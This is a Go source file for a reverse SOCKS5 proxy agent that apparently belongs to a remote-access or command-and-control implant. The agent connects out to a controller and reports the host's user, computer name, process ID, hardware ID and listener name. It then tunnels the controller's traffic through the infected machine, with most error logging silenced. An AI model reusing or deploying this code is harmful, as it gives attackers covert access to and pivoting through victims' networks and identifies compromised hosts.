package Proxy

import (
	"crypto/tls"
	"errors"
	"io"
	"log"

	"main/MessagePack"
	"main/PcInfo"
	"math"
	"net"
	"sync"

	"github.com/Acebond/ReverseSocks5/bufferpool"
	"github.com/Acebond/ReverseSocks5/mux"
	"github.com/Acebond/ReverseSocks5/statute"
)

var (
	bufferPool = bufferpool.NewPool(math.MaxUint16)
)

func ReverseSocksAgent[T any](serverAddress, psk string, useTLS bool, conn T, sendFunc func([]byte, T), TunnelPort, Socks5Port, HPID, UserName, Password string) {
	//log.Println("Connecting to socks server at " + serverAddress)

	var dialConn net.Conn
	var err error

	if useTLS {
		dialConn, err = tls.Dial("tcp", serverAddress, nil)
	} else {
		dialConn, err = net.Dial("tcp", serverAddress)
	}

	if err != nil {
		//log.Fatalln(err.Error())
	}
	//log.Println("Connected")

	msgpack := new(MessagePack.MsgPack)
	msgpack.ForcePathObject("Pac_ket").SetAsString("ProxyInfo")
	msgpack.ForcePathObject("ProcessID").SetAsString(PcInfo.ProcessID)
	msgpack.ForcePathObject("User").SetAsString(PcInfo.GetCurrentUser())
	msgpack.ForcePathObject("TunnelPort").SetAsString(TunnelPort)
	msgpack.ForcePathObject("Socks5Port").SetAsString(Socks5Port)
	msgpack.ForcePathObject("HWID").SetAsString(PcInfo.HWID)
	msgpack.ForcePathObject("ListenerName").SetAsString(PcInfo.ListenerName)
	msgpack.ForcePathObject("UserName").SetAsString(UserName)
	msgpack.ForcePathObject("Password").SetAsString(Password)
	msgpack.ForcePathObject("Computer").SetAsString(PcInfo.GetClientComputer())
	msgpack.ForcePathObject("HPID").SetAsString(HPID)

	sendFunc(msgpack.Encode2Bytes(), conn)

	session := mux.Server(dialConn, psk)

	for {
		stream, err := session.AcceptStream()
		if err != nil {
			//log.Println(err.Error())
			break
		}
		go func() {
			if err := ServeConn(stream); err != nil && err != mux.ErrPeerClosedStream {
				//log.Println(err.Error())
			}
		}()
	}

	session.Close()
}

// Accepts connections and tunnels the traffic to the SOCKS server running on the client.
func TunnelServer(listenAddress, username, password string, session *mux.Mux) {
	//log.Println("Listening for socks clients on " + listenAddress)

	ln, err := net.Listen("tcp", listenAddress)
	if err != nil {
		log.Fatalln(err.Error())
	}
	defer ln.Close()

	authMethod := Authenticator(&NoAuthAuthenticator{})

	if len(password) > 0 {
		authMethod = &UserPassAuthenticator{username, password}
	}

	for {
		conn, err := ln.Accept()
		if err != nil {
			if errors.Is(err, net.ErrClosed) {
				break
			} else {
				log.Println(err.Error())
				continue
			}
		}

		stream, err := session.OpenStream()
		if err != nil {
			conn.Close()
			log.Println(err.Error())
			// This is unrecoverable as the socks server is not opening connections.
			break
		}

		go handleSocksClient(conn, stream, authMethod)

	}
}

func doauth(conn net.Conn, authMethod Authenticator) error {

	// Check its a really SOCKS5 connection
	mr, err := statute.ParseMethodRequest(conn)
	if err != nil {
		return err
	}
	if mr.Ver != statute.VersionSocks5 {
		return statute.ErrNotSupportVersion
	}

	// Select a usable method
	for _, method := range mr.Methods {
		if authMethod.GetCode() == method {
			return authMethod.Authenticate(conn)

		}
	}

	// No usable method found
	conn.Write([]byte{statute.VersionSocks5, statute.MethodNoAcceptable}) //nolint: errcheck
	return statute.ErrNoSupportedAuth
}

func handleSocksClient(conn net.Conn, stream net.Conn, authMethod Authenticator) {
	defer conn.Close()
	defer stream.Close()

	if err := doauth(conn, authMethod); err != nil {
		//log.Printf("failed to authenticate: %v", err.Error())
		return
	}

	// Proxy the data
	var wg sync.WaitGroup
	wg.Add(2)

	go func() {
		buf := bufferPool.Get()
		defer bufferPool.Put(buf)
		io.CopyBuffer(conn, stream, buf[:cap(buf)])
		// io.Copy(conn, stream)
		wg.Done()
	}()
	go func() {
		buf := bufferPool.Get()
		defer bufferPool.Put(buf)
		io.CopyBuffer(stream, conn, buf[:cap(buf)])
		wg.Done()
	}()

	wg.Wait()
}
